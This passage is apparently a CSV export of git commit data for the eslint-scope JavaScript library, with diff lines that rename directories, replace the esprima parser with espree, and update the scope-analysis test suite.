fallback.""<c> function() {<\n>-        expect(function() {<\n>-            analyze(ast<c> {fallback: ""none""});<\n>-    it(""should not raise an error even if it encountered an unknown node when fallback is iteration.""<c> function() {<\n>-        analyze(ast<c> {fallback: ""iteration""});<\n>-    it(""should not raise an error even if it encountered an unknown node when fallback is a function.""<c> function() {<\n>-        analyze(ast<c> {fallback: node => Object.keys(node)});<\n>-describe(""function name""<c> function() {<\n>-    it(""should create its special scope""<c> function() {<\n>-describe(""ScopeManager.prototype.getDeclaredVariables""<c> function() {<\n>-    it(""should get variables that declared on `VariableDeclaration`""<c> function() {<\n>-    it(""should get variables that declared on `VariableDeclaration` in for-in/of""<c> function() {<\n>-    it(""should get variables that declared on `VariableDeclarator`""<c> function() {<\n>-    it(""should get variables that declared on `FunctionDeclaration`""<c> function() {<\n>-    it(""should get variables that declared on `FunctionExpression`""<c> function() {<\n>-    it(""should get variables that declared on `ArrowFunctionExpression`""<c> function() {<\n>-    it(""should get variables that declared on `ClassDeclaration`""<c> function() {<\n>-    it(""should get variables that declared on `ClassExpression`""<c> function() {<\n>-    it(""should get variables that declared on `CatchClause`""<c> function() {<\n>-    it(""should get variables that declared on `ImportDeclaration`""<c> function() {<\n>-    it(""should get variables that declared on `ImportSpecifier`""<c> function() {<\n>-    it(""should get variables that declared on `ImportDefaultSpecifier`""<c> function() {<\n>-    it(""should get variables that declared on `ImportNamespaceSpecifier`""<c> function() {<\n>-    it(""should not get duplicate even if it's declared twice""<c> function() {<\n>-describe(""global increment""<c> function() {<\n>-    it(""becomes read/write""<c> function() {<\n>-describe(""implicit global reference""<c> function() {<\n>-    it(""assignments global scope""<c> function() {<\n>-    it(""assignments global scope without definition""<c> function() {<\n>-    it(""assignments global scope without definition eval""<c> function() {<\n>-    it(""assignment leaks""<c> function() {<\n>-    it(""assignment doesn\'t leak""<c> function() {<\n>-    it(""for-in-statement leaks""<c> function() {<\n>-    it(""for-in-statement doesn\'t leaks""<c> function() {<\n>-describe(""impliedStrict option""<c> function() {<\n>-    it(""ensures all user scopes are strict if ecmaVersion >= 5""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 5<c> impliedStrict: true});<\n>-    it(""ensures impliedStrict option is only effective when ecmaVersion option >= 5""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 3<c> impliedStrict: true});<\n>-    it(""omits a nodejs global scope when ensuring all user scopes are strict""<c> function() {<\n>-        let scopeManager = analyze(ast<c> {ecmaVersion: 5<c> nodejsScope: true<c> impliedStrict: true});<\n>-    it(""omits a module global scope when ensuring all user scopes are strict""<c> function() {<\n>-        let scopeManager = analyze(ast<c> {ecmaVersion: 6<c> impliedStrict: true<c> sourceType: ""module""});<\n>-describe(""label""<c> function() {<\n>-    it(""should not create variables""<c> function() {<\n>-    it(""should count child node references""<c> function() {<\n>-describe(""nodejsScope option""<c> function() {<\n>-    it(""creates a function scope following the global scope immediately""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> nodejsScope: true});<\n>-    it(""creates a function scope following the global scope immediately and creates module scope""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> nodejsScope: true<c> sourceType: ""module""});<\n>-describe(""object expression""<c> function() {<\n>-    it(""doesn\'t require property type""<c> function() {<\n>-describe(""optimistic""<c> function() {<\n>-    it(""direct call to eval""<c> function() {<\n>-        const scopes = analyze(ast<c> {optimistic: true}).scopes;<\n>-    it(""with statement""<c> function() {<\n>-        const scopes = analyze(ast<c> {optimistic: true}).scopes;<\n>-describe(""References:""<c> function() {<\n>-    describe(""When there is a `let` declaration on global<c>""<c> function() {<\n>-        it(""the reference on global should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in functions should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in default parameters should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `const` declaration on global<c>""<c> function() {<\n>-        it(""the reference on global should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in functions should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `var` declaration on global<c>""<c> function() {<\n>-        it(""the reference on global should NOT be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in functions should NOT be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `function` declaration on global<c>""<c> function() {<\n>-        it(""the reference on global should NOT be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in functions should NOT be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `class` declaration on global<c>""<c> function() {<\n>-        it(""the reference on global should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in functions should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `let` declaration in functions<c>""<c> function() {<\n>-        it(""the reference on the function should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in nested functions should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `var` declaration in functions<c>""<c> function() {<\n>-        it(""the reference on the function should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""the reference in nested functions should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""When there is a `let` declaration with destructuring assignment""<c> function() {<\n>-        it(""\""let [a] = [1];\""<c> the reference should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""\""let {a} = {a: 1};\""<c> the reference should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        it(""\""let {a: {a}} = {a: {a: 1}};\""<c> the reference should be resolved.""<c> function() {<\n>-            const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""Reference.init should be a boolean value of whether it is one to initialize or not.""<c> function() {<\n>-            it(`""${code}""<c> all references should be true.`<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-            it(`""${code}""<c> all references should be false.`<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-            it(`""${code}""<c> readonly references of ""a"" should be undefined.`<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""with""<c> function() {<\n>-    it(""creates scope""<c> function() {<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Sat,14,30,11 Mar 2017,Chore: Rename src to lib and test to tests (#20),1,0,4,44,653,"+/node_modules<\n>+coverage/<\n>+build/<\n>+.DS_Store<\n>+.idea<\n>+*.iml<\n>+/.vscode<\n>+.sublimelinterrc<\n>+    JS_FILES = ""lib/**/*.js""<c><\n>+    TEST_FILES = ""tests/*.js"";<\n>+  ""main"": ""lib/index.js""<c><\n>+    analyze = require("".."").analyze;<\n>","-# Emacs<\n>-*~<\n>-\#*\#<\n>-# Node modules<\n>-node_modules/<\n>-/build/<\n>-# Cover<\n>-/coverage/<\n>-npm-debug.log<\n>-.vimrc.local<\n>-# JSDoc<\n>-/out/<\n>-/lib/<\n>-/powered-test/<\n>-npm-debug.log<\n>-.DS_Store<\n>-.vimrc.local<\n>-t.js<\n>-.travis.yml<\n>-.npmignore<\n>-/tmp/<\n>-/.git/<\n>-/node_modules/<\n>-/tools/<\n>-/test/<\n>-/cover_html/<\n>-/.coverage_data/<\n>-/out/<\n>-    JS_FILES = ""src/**/*.js""<c><\n>-    TEST_FILES = ""test/*.js"";<\n>-  ""main"": ""src/index.js""<c><\n>-    analyze = require(""../src"").analyze;<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Wed,11,2,22 Feb 2017,Chore: Remove esprima (#19),1,0,42,4992,201405,"+    TEST_FILES = ""test/*.js"";<\n>+var espree = require('espree');<\n>+var ast = espree.parse(code);<\n>+         * @member {espree.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>+         * @member {espree.Node} Definition#node - the enclosing node of the identifier.<\n>+         * @member {espree.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>+ * Mozilla Parser API</a>. E.g. <a href=""https://github.com/eslint/espree"">espree</a> is a parser<\n>+ * Main interface function. Takes an Espree syntax tree and returns the<\n>+ * @param {espree.Tree} tree - Abstract Syntax Tree<\n>+    // But espree 2.0 parses to ArrayExpression<c> ObjectExpression<c> etc...<\n>+         * @member {espreeIdentifier} Reference#identifier<\n>+             * @member {espreeNode} Reference#writeExpr<\n>+     * @param {Espree.Node} node - a node to get.<\n>+     * @param {Espree.Node} node - node for the acquired scope.<\n>+     * @param {Espree.Node} node - node for the acquired scope.<\n>+     * @param {Espree.Node} node - releasing node.<\n>+         * @member {espree.Node} Scope#block<\n>+     * @param {Espree.Identifier} ident - identifier to be resolved.<\n>+         * @member {espree.Identifier[]} Variable#identifiers<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.be.equal(""a"");<\n>+        expect(scope.variables[1].name).to.be.equal(""b"");<\n>+        expect(scope.variables[2].name).to.be.equal(""c"");<\n>+        expect(scope.variables[3].name).to.be.equal(""d"");<\n>+        expect(scope.references).to.have.length(0);<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        let ast = espree(`<\n>+        ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        let ast = espree(`<\n>+        ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        expect(scope.variables[3].defs[0].rest).to.be.true;<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""export var v;"");<\n>+        const ast = espree(""export default function f(){};"");<\n>+        const ast = espree(""export default function(){};"");<\n>+        const ast = espree(""export default 42;"");<\n>+        const ast = espree(""export {x};"");<\n>+        const ast = espree(""export {v as x};"");<\n>+        const ast = espree(""export {x} from \""mod\"";"");<\n>+        const ast = espree(""export {v as x} from \""mod\"";"");<\n>+        const ast = espree(""export * from \""mod\"";"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""import v from \""mod\"";"");<\n>+        const ast = espree(""import * as ns from \""mod\"";"");<\n>+        const ast = espree(""import {x} from \""mod\"";"");<\n>+        const ast = espree(""import {x as v} from \""mod\"";"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+    it(""materialize rest argument in scope""<c> function() {<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        analyze(ast); // default is `fallback: ""iteration""`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+    /* eslint-disable require-jsdoc */<\n>+            [""A""<c> ""A""]<c> // outer scope""s and inner scope""s.<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""b++;"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+    it(""assignment doesn\'t leak""<c> function() {<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+    it(""for-in-statement doesn\'t leaks""<c> function() {<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+                    ""use strict"";<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+            function foo() {}`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""function bar() { q: for(;;) { break q; } }"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+            ""use strict"";<\n>+        const ast = espree(`<\n>+            import {x as v} from ""mod"";`<\n>+    it(""doesn\'t require property type""<c> function() {<\n>+        // Hardcoded AST.  Escope adds an extra ""Property""<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        `<c> ""script"");<\n>+const espree = require(""./util/espree"");<\n>+""use strict"";<\n>+var espree = require(""espree"");<\n>+module.exports = function(code<c> sourceType) {<\n>+    sourceType = sourceType || ""module"";<\n>+    return espree.parse(code<c> {<\n>+        sourceType: sourceType<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        `<c> ""script"");<\n>","-esprima.js<\n>-    TEST_FILES = ""test/**/*.js"";<\n>-var esprima = require('esprima');<\n>-var ast = esprima.parse(code);<\n>-        <\n>-        <\n>-    ""esprima"": ""^2.7.1""<c><\n>-         * @member {esprima.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>-         * @member {esprima.Node} Definition#node - the enclosing node of the identifier.<\n>-         * @member {esprima.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>- * Mozilla Parser API</a>. E.g. <a href=""http://esprima.org"">esprima</a> is a parser<\n>- * Main interface function. Takes an Esprima syntax tree and returns the<\n>- * @param {esprima.Tree} tree - Abstract Syntax Tree<\n>-    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>-         * @member {esprima#Identifier} Reference#identifier<\n>-             * @member {esprima#Node} Reference#writeExpr<\n>-     * @param {Esprima.Node} node - a node to get.<\n>-     * @param {Esprima.Node} node - node for the acquired scope.<\n>-     * @param {Esprima.Node} node - node for the acquired scope.<\n>-     * @param {Esprima.Node} node - releasing node.<\n>-         * @member {esprima.Node} Scope#block<\n>-     * @param {Esprima.Identifier} ident - identifier to be resolved.<\n>-         * @member {esprima.Identifier[]} Variable#identifiers<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        // FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>-        // https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>-        //<\n>-        // expect(scope.variables).to.have.length(4);<\n>-        // expect(scope.variables[0].name).to.be.equal('a');<\n>-        // expect(scope.variables[1].name).to.be.equal('b');<\n>-        // expect(scope.variables[2].name).to.be.equal('c');<\n>-        // expect(scope.variables[3].name).to.be.equal('d');<\n>-        // expect(scope.references).to.have.length(0);<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-const harmony = require(""../third_party/esprima"");<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        let ast = harmony.parse(`<\n>-        ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        let ast = harmony.parse(`<\n>-        ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        expect(scope.variables[3].defs[0].rest).to.be.false;<\n>-        // ast = espree.parse(`<\n>-        //     (function ([a<c> b<c> ...[c<c> d<c> ...rest]]) {<\n>-        //     }(array));<\n>-        // `);<\n>-        // scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        // expect(scopeManager.scopes).to.have.length(2);<\n>-        // scope = scopeManager.scopes[0];<\n>-        // expect(scope.type).to.be.equal('global');<\n>-        // expect(scope.variables).to.have.length(0);<\n>-        // expect(scope.references).to.have.length(0);<\n>-        // expect(scope.implicit.left).to.have.length(1);<\n>-        // expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        // scope = scopeManager.scopes[1];<\n>-        // expect(scope.type).to.be.equal('function');<\n>-        // expect(scope.variables).to.have.length(6);<\n>-        // const expectedVariableNames = [<\n>-        //     'arguments'<\n>-        //     'a'<\n>-        //     'b'<\n>-        //     'c'<\n>-        //     'd'<\n>-        //     'rest'<\n>-        // ];<\n>-        // for (let index = 0; index < expectedVariableNames.length; index++) {<\n>-        //     expect(scope.variables[index].name).to.be.equal(expectedVariableNames[index]);<\n>-        // }<\n>-        // expect(scope.references).to.have.length(6);<\n>-        // const expectedReferenceNames = [<\n>-        //         'a'<\n>-        //         'b'<\n>-        //         'c'<\n>-        //         'd'<\n>-        //         'rest'<\n>-        //     ]<\n>-        // for (let index = 0; index < expectedReferenceNames.length; index++) {<\n>-        //     expect(scope.references[index].identifier.name).to.be.equal(expectedReferenceNames[index]);<\n>-        //     expect(scope.references[index].isWrite()).to.be.true<\n>-        //     expect(scope.references[index].partial).to.be.true<\n>-        // }<\n>-        // expect(scope.references[5].identifier.name).to.be.equal('array');<\n>-        // expect(scope.references[5].isWrite()).to.be.false;<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = espree(""export var v;""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default function f(){};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default function(){};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default 42;""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {x};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {v as x};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {x} from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {v as x} from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export * from \""mod\"";""<c> {sourceType: ""module""});<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = espree(""import v from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree( ""import * as ns from \""mod\"";""<c> {sourceType: ""module""<\n>-        });<\n>-        const ast = espree(""import {x} from \""mod\"";""<c> {sourceType: ""module""<\n>-        });<\n>-        const ast = espree(""import {x as v} from \""mod\"";""<c> {sourceType: ""module""});<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/espree"");<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const esprima = require(""../third_party/esprima"").parse;<\n>-const espree = require(""../third_party/espree"");<\n>-    it(""materialize rest argument in scope (esprima: rest property of FunctionDeclaration)""<c> function() {<\n>-        const ast = esprima(`<\n>-            function foo(...bar) {<\n>-                return bar;<\n>-            }<\n>-        `);<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scopeManager.scopes).to.have.length(2);<\n>-        let scope = scopeManager.scopes[0];<\n>-        expect(scope.type).to.be.equal(""global"");<\n>-        expect(scope.block.type).to.be.equal(""Program"");<\n>-        expect(scope.isStrict).to.be.false;<\n>-        expect(scope.variables).to.have.length(1);<\n>-        scope = scopeManager.scopes[1];<\n>-        expect(scope.type).to.be.equal(""function"");<\n>-        expect(scope.variables).to.have.length(2);<\n>-        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>-        expect(scope.variables[1].name).to.be.equal(""bar"");<\n>-        expect(scope.variables[1].defs[0].name.name).to.be.equal(""bar"");<\n>-        expect(scope.variables[1].defs[0].rest).to.be.true;<\n>-    });<\n>-    it(""materialize rest argument in scope (espree: RestElement)""<c> function() {<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const esprima = require(""../third_party/esprima"");<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-        analyze(ast); // default is `fallback: 'iteration'`<\n>-        const ast = esprima.parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-    /**<\n>-     * Verify<\n>-     * @param {AST} ast - Abstract syntax tree<\n>-     * @param {string} type - type<\n>-     * @param {array} expectedNamesList - expected names<\n>-     * @returns {void}<\n>-     */<\n>-            [""A""<c> ""A""]<c> // outer scope's and inner scope's.<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(""b++;"");<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-    it(""assignment doesn't leak""<c> function() {<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-    it(""for-in-statement doesn't leaks""<c> function() {<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-                    'use strict';<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-            function foo() {}`<c><\n>-            {sourceType: ""module""}<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(""function bar() { q: for(;;) { break q; } }"");<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-            'use strict';<\n>-        const ast = parse(`<\n>-            import {x as v} from ""mod"";`<c><\n>-            {sourceType: ""module"" }<\n>-    it(""doesn't require property type""<c> function() {<\n>-        // Hardcoded AST.  Esprima adds an extra 'Property'<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        `);<\n>-const espree = require(""../third_party/espree"");<\n>-var espree = require('espree');<\n>-module.exports = function (code) {<\n>-    return espree.parse(code<c> {<\n>-        // attach range information to each node<\n>-        range: true<c><\n>-        // attach line/column location information to each node<\n>-        loc: true<c><\n>-        // create a top-level comments array containing all comments<\n>-        comments: true<c><\n>-        // attach comments to the closest relevant node as leadingComments and<\n>-        // trailingComments<\n>-        attachComment: true<c><\n>-        // create a top-level tokens array containing all tokens<\n>-        tokens: true<c><\n>-        // try to continue parsing if an error is encountered<c> store errors in a<\n>-        // top-level errors array<\n>-        tolerant: true<c><\n>-        ecmaVersion: 6<c><\n>-        sourceType: ""module""<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        `);<\n>-/*<\n>-  Copyright (C) 2013 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Copyright (C) 2013 Thaddee Tyl <thaddee.tyl@gmail.com><\n>-  Copyright (C) 2012 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Copyright (C) 2012 Mathias Bynens <mathias@qiwi.be><\n>-  Copyright (C) 2012 Joost-Wim Boekesteijn <joost-wim@boekesteijn.nl><\n>-  Copyright (C) 2012 Kris Kowal <kris.kowal@cixar.com><\n>-  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Copyright (C) 2012 Arpad Borsos <arpad.borsos@googlemail.com><\n>-  Copyright (C) 2011 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-/*jslint bitwise:true plusplus:true */<\n>-/*global esprima:true<c> define:true<c> exports:true<c> window: true<c><\n>-throwError: true<c> generateStatement: true<c> peek: true<c><\n>-parseAssignmentExpression: true<c> parseBlock: true<c><\n>-parseClassExpression: true<c> parseClassDeclaration: true<c> parseExpression: true<c><\n>-parseForStatement: true<c><\n>-parseFunctionDeclaration: true<c> parseFunctionExpression: true<c><\n>-parseFunctionSourceElements: true<c> parseVariableIdentifier: true<c><\n>-parseImportSpecifier: true<c><\n>-parseLeftHandSideExpression: true<c> parseParams: true<c> validateParam: true<c><\n>-parseSpreadOrAssignmentExpression: true<c><\n>-parseStatement: true<c> parseSourceElement: true<c> parseConciseBody: true<c><\n>-parseYieldExpression: true<\n>-*/<\n>-(function (root<c> factory) {<\n>-    'use strict';<\n>-    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>-    // Rhino<c> and plain browser loading.<\n>-    /* istanbul ignore next */<\n>-    if (typeof define === 'function' && define.amd) {<\n>-        define(['exports']<c> factory);<\n>-    } else if (typeof exports !== 'undefined') {<\n>-        factory(exports);<\n>-    } else {<\n>-        factory((root.esprima = {}));<\n>-    }<\n>-    'use strict';<\n>-    var Token<c><\n>-        TokenName<c><\n>-        FnExprTokens<c><\n>-        Syntax<c><\n>-        PropertyKind<c><\n>-        Messages<c><\n>-        Regex<c><\n>-        SyntaxTreeDelegate<c><\n>-        ClassPropertyType<c><\n>-        source<c><\n>-        strict<c><\n>-        index<c><\n>-        lineNumber<c><\n>-        lineStart<c><\n>-        length<c><\n>-        delegate<c><\n>-        lookahead<c><\n>-        state<c><\n>-        extra;<\n>-    Token = {<\n>-        BooleanLiteral: 1<c><\n>-        EOF: 2<c><\n>-        Identifier: 3<c><\n>-        Keyword: 4<c><\n>-        NullLiteral: 5<c><\n>-        NumericLiteral: 6<c><\n>-        Punctuator: 